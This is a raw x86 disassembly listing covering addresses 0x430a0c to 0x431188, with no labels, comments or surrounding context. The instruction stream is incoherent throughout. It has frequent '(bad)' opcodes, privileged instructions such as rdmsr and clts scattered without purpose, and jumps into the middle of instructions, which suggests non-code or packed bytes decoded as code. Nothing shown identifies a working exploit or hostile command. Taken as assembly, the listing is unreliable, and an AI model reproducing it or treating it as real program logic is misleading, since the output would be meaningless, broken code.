  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
